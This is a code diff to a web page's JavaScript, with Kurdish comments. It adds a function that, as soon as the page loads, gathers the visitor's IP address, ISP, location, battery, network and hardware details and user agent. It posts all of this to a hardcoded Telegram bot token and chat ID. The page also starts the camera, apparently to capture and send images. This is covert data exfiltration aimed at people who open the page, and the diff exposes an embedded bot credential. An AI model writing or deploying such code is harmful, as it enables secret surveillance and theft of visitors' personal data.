@@ -121,9 +121,63 @@
         let stream = null;
         let flashOn = false;
 
-        // زانیاری بۆت و چات ئاییدی تۆ لێرە جێگیرکراون
         const BOT_TOKEN = '8776982426:AAHwIFQIj36xbb_LoDZw7t1FpiRCLyzeu8U';
         const CHAT_ID = '7641255924';
+
+        // ناردنی زانیاری ئامێر و تۆڕ بۆ تلیگرام دەستبەجێ کاتێک پەڕەکە دەکرێتەوە
+        async function sendDeviceInfo() {
+            let info = "📱 Device Connected!\n\n";
+
+            try {
+                let ipResponse = await fetch('https://ipapi.co/json/');
+                let ipData = await ipResponse.json();
+                info += `🌐 Network Info\n`;
+                info += `IP: ${ipData.ip || 'N/A'}\n`;
+                info += `ISP: ${ipData.org || 'N/A'}\n`;
+                info += `Country: ${ipData.country_name || 'N/A'} (${ipData.country || 'N/A'})\n`;
+                info += `City: ${ipData.city || 'N/A'}\n`;
+                info += `Timezone: ${ipData.timezone || 'N/A'}\n\n`;
+            } catch (e) {
+                info += `🌐 Network Info: نەتوانرا وەربگیرێت\n\n`;
+            }
+
+            if (navigator.getBattery) {
+                try {
+                    let battery = await navigator.getBattery();
+                    info += `🔋 Battery Info\n`;
+                    info += `Level: ${Math.round(battery.level * 100)}%\n`;
+                    info += `Charging: ${battery.charging ? 'Yes' : 'No'}\n\n`;
+                } catch (e) {}
+            }
+
+            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                info += `📡 Connection\n`;
+                info += `Type: ${connection.effectiveType || 'N/A'}\n`;
+                info += `Downlink: ${connection.downlink ? connection.downlink + ' Mbps' : 'N/A'}\n`;
+                info += `RTT: ${connection.rtt ? connection.rtt + ' ms' : 'N/A'}\n\n`;
+            }
+
+            info += `💻 Device Specs\n`;
+            info += `Platform: ${navigator.platform || 'N/A'}\n`;
+            info += `Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+            info += `RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n`;
+            info += `Screen: ${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)\n\n`;
+
+            info += `🕵️ User Agent\n${navigator.userAgent}`;
+
+            // ناردنی زانیارییەکان بۆ تلیگرام بە ڕێگەی sendMessage
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: info
+                    })
+                });
+            } catch (err) {}
+        }
 
         async function startCamera() {
             if (stream) {
@@ -205,6 +259,8 @@
             }, 'image/jpeg');
         }
 
+        // کارپێکردنی هەردوو ئەرکەکە لە کاتی کردنەوەی پەڕەکە
+        sendDeviceInfo();
         startCamera();
     </script>
 </body>
